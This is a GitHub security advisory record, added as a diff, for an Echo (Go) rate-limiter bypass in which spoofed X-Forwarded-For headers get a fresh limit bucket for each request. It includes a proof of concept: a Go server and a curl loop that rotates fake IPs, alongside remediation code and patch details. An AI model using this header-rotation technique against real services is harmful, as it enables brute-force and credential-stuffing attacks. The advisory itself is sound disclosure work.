@@ -1,0 +1,76 @@
+{
+  "id": "GHSA-246p-cpwv-v3jq",
+  "modified": "2026-10-28T20:00:03.857322848Z",
+  "published": "2026-10-28T19:53:47Z",
+  "aliases": [
+    "CVE-2026-118653"
+  ],
+  "summary": "Echo has Rate Limiter Bypass via Spoofed X-Forwarded-For Header in Default Configuration",
+  "details": "## Summary\n\nWhen `echo.New()` is used without explicitly setting `Echo#IPExtractor`, the `RealIP()` method falls back to reading the client-supplied `X-Forwarded-For` (or `X-Real-IP`) header without any proxy-origin validation. The default `RateLimiter()` middleware derives its per-client identifier from `ctx.RealIP()`, so an attacker can rotate arbitrary values in the `X-Forwarded-For` header on each request to obtain a fresh rate-limit bucket and bypass IP-based throttling entirely.\n\n## Affected Component\n\n- `context.go` — `(*Context).RealIP()` (lines 186–208), legacy fallback branch (lines 190–200)\n- `middleware/rate_limiter.go` — `DefaultRateLimiterConfig.IdentifierExtractor` (lines 46–58); `RateLimiter()` (lines 71–76)\n- `echo.go` — `New()` (lines 326–343), `IPExtractor` left `nil` by default\n\n## Description\n\n### `RealIP()` unconditionally trusts `X-Forwarded-For` when `IPExtractor` is unset\n\n`Context.RealIP()` (`context.go:186-208`) first checks `c.echo.IPExtractor`. When this field is `nil` (the default for `echo.New()`), it falls through to legacy behavior and returns the **first IP** from the `X-Forwarded-For` header — the position an attacker has full control over:\n\n```go\n// context.go:186-200\nfunc (c *Context) RealIP() string {\n    if c.echo != nil \u0026\u0026 c.echo.IPExtractor != nil {\n        return c.echo.IPExtractor(c.request)\n    }\n    // Fall back to legacy behavior\n    if ip := c.request.Header.Get(HeaderXForwardedFor); ip != \"\" {\n        i := strings.IndexAny(ip, \",\")\n        if i \u003e 0 {\n            xffip := strings.TrimSpace(ip[:i])\n            xffip = strings.TrimPrefix(xffip, \"[\")\n            xffip = strings.TrimSuffix(xffip, \"]\")\n            return xffip   // ← attacker-controlled first IP\n        }\n        return ip\n    }\n    if ip := c.request.Header.Get(HeaderXRealIP); ip != \"\" {\n        ...\n        return ip          // ← also attacker-controlled\n    }\n    ra, _, _ := net.SplitHostPort(c.request.RemoteAddr)\n    return ra\n}\n```\n\n### Rate limiter default identifier extractor calls `RealIP()` unconditionally\n\n`DefaultRateLimiterConfig` (`rate_limiter.go:46-58`) sets the identifier extractor to `ctx.RealIP()` with no guard for whether a safe `IPExtractor` is configured:\n\n```go\n// rate_limiter.go:46-58\nvar DefaultRateLimiterConfig = RateLimiterConfig{\n    Skipper: DefaultSkipper,\n    IdentifierExtractor: func(ctx *echo.Context) (string, error) {\n        id := ctx.RealIP()   // ← reads attacker-controlled header\n        return id, nil\n    },\n    ...\n}\n```\n\n`RateLimiter(store)` (`rate_limiter.go:71-76`) copies `DefaultRateLimiterConfig` directly:\n\n```go\n// rate_limiter.go:71-76\nfunc RateLimiter(store RateLimiterStore) echo.MiddlewareFunc {\n    config := DefaultRateLimiterConfig\n    config.Store = store\n    return RateLimiterWithConfig(config)\n}\n```\n\nThe result is that the most common usage pattern — `e.GET(\"/path\", h, middleware.RateLimiter(store))` — produces a rate limiter whose per-client identifier is fully controlled by the requester.\n\n### Framework acknowledges the issue for IP extraction but the rate limiter carries no warning\n\n`ip.go:27` explicitly states the default is insecure:\n\n\u003e \"Note: if you don't set `Echo#IPExtractor` explicitly, Echo fallback to legacy behavior, which is not a good choice.\"\n\nAnd `ip.go:117-119`:\n\n\u003e \"In default behavior, Echo sees all of first XFF header, X-Real-IP header and IP from network layer. As you might already notice, after reading this article, this is not good. Sole reason this is default is just backward compatibility.\"\n\nThe `IPExtractor` mechanism (`ExtractIPDirect()`, `ExtractIPFromXFFHeader()`, `ExtractIPFromRealIPHeader()`) in `ip.go` exists precisely to close this gap. However, the `RateLimiter()` function and `DefaultRateLimiterConfig` have **no corresponding warning** and make no attempt to detect or flag that `IPExtractor` is unset, leaving operators who follow the standard rate limiter example silently exposed.\n\nThe test `TestRateLimiterWithConfig_defaultConfig` (`rate_limiter_test.go:181-226`) itself drives the rate limiter by setting `X-Real-IP` directly on the test request — demonstrating that the identifier is freely injectable without comment or mitigation.\n\n### Full execution chain\n\n1. Server starts with `echo.New()` (no `IPExtractor` set) and `e.GET(\"/limited\", h, middleware.RateLimiter(store))`\n2. Attacker sends `GET /limited` with header `X-Forwarded-For: 1.2.3.4` — rate bucket for `1.2.3.4` consumed\n3. Attacker sends `GET /limited` again with `X-Forwarded-For: 1.2.3.4` — second token consumed; if burst is 1, next request would be 429\n4. Attacker sends `GET /limited` with `X-Forwarded-For: 5.6.7.8` — **new bucket created** for `5.6.7.8`, 200 OK returned\n5. Attacker repeats step 4 with arbitrary IPs — rate limit never triggers; unlimited requests served\n\n## Proof of Concept\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n    echo \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n    // NOTE: IPExtractor deliberately NOT set — this is the default\n    store := middleware.NewRateLimiterMemoryStore(1)\n    e.GET(\"/limited\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"ok\")\n    }, middleware.RateLimiter(store))\n    e.Logger.Fatal(e.Start(\":1324\"))\n}\n```\n\n```bash\n# First request with IP 1.1.1.1 — consumes burst token\ncurl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited\n# HTTP/1.1 200 OK\n\n# Second request with same IP — rate limited\ncurl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited\n# HTTP/1.1 429 Too Many Requests\n\n# Third request with DIFFERENT spoofed IP — bypass: new bucket, 200 OK\ncurl -i -H 'X-Forwarded-For: 2.2.2.2' http://127.0.0.1:1324/limited\n# HTTP/1.1 200 OK\n\n# Repeat indefinitely with rotating IPs — rate limit never triggers\nfor i in $(seq 1 100); do\n  curl -s -o /dev/null -w \"%{http_code}\\n\" -H \"X-Forwarded-For: 10.0.0.$i\" http://127.0.0.1:1324/limited\ndone\n# 200 200 200 ... (all 200, never 429)\n```\n\n## Impact\n\n- Attackers can make unlimited requests to any endpoint protected by `middleware.RateLimiter()` using the default configuration by rotating the `X-Forwarded-For` header\n- Brute-force attacks against login, password reset, 2FA, and similar authentication endpoints are unthrottled\n- API abuse and credential stuffing are possible at arbitrary throughput\n- Any per-IP security control that relies on `ctx.RealIP()` with default configuration (access logging, geo-blocking, audit trails) is equally undermined\n\n## Recommended Remediation\n\n### Option 1: Require explicit `IPExtractor` configuration in `RateLimiter()` (preferred)\n\nThe `RateLimiter()` convenience function should detect when `IPExtractor` is not configured and either panic with a clear message or fall back to `ExtractIPDirect()` (direct-connection IP only):\n\n```go\n// rate_limiter.go — illustrative change\nvar DefaultRateLimiterConfig = RateLimiterConfig{\n    Skipper: DefaultSkipper,\n    IdentifierExtractor: func(ctx *echo.Context) (string, error) {\n        if ctx.Echo().IPExtractor == nil {\n            // Fall back to direct TCP peer address — safe for non-proxied deployments\n            host, _, err := net.SplitHostPort(ctx.Request().RemoteAddr)\n            if err != nil {\n                return ctx.Request().RemoteAddr, nil\n            }\n            return host, nil\n        }\n        return ctx.RealIP(), nil\n    },\n    ...\n}\n```\n\n### Option 2: Document and warn in `RateLimiter()` godoc\n\nAt minimum, add a prominent warning to the `RateLimiter()` and `DefaultRateLimiterConfig` documentation directing users to configure `Echo#IPExtractor` before using IP-based rate limiting, mirroring the guidance already present in `ip.go`.\n\n```go\n// RateLimiter returns a rate limiting middleware.\n//\n// SECURITY: The default IdentifierExtractor uses ctx.RealIP(), which reads\n// X-Forwarded-For / X-Real-IP headers. Without setting Echo#IPExtractor,\n// these headers are fully client-controlled and can be spoofed to bypass\n// rate limiting. Set e.IPExtractor = echo.ExtractIPDirect() (no proxy) or\n// echo.ExtractIPFromXFFHeader() (trusted proxy) before using this middleware.\n// See https://echo.labstack.com/guide/ip-address for details.\nfunc RateLimiter(store RateLimiterStore) echo.MiddlewareFunc {\n```\n\n## Credit\n\nThis vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.1.0: without `Echo#IPExtractor`, `Context.RealIP()` returns the address of the direct peer; the previous behavior is available as `LegacyIPExtractor`.\n\n`github.com/labstack/echo/v4` keeps its default for compatibility.\n\n## Workarounds\n\nConfigure `Echo#IPExtractor` for your deployment (`echo.ExtractIPDirect()` without a proxy, `echo.ExtractIPFromXFFHeader()` behind proxies, with `TrustIPRange` for proxies on public addresses), or set `RateLimiterConfig.IdentifierExtractor` to an identifier that clients cannot choose.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/labstack/echo/v5",
+        "purl": "pkg:golang/github.com/labstack/echo/v5"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.1.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-246p-cpwv-v3jq/GHSA-246p-cpwv-v3jq.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/labstack/echo/v4",
+        "purl": "pkg:golang/github.com/labstack/echo/v4"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.0.0"
+            },
+            {
+              "last_affected": "4.16.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-246p-cpwv-v3jq/GHSA-246p-cpwv-v3jq.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/labstack/echo/security/advisories/GHSA-246p-cpwv-v3jq"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/labstack/echo/commit/22e4b71109ef072ef011a489066ec662ca9565b2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/labstack/echo"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/labstack/echo/releases/tag/v5.1.0"
+    }
+  ]
+}
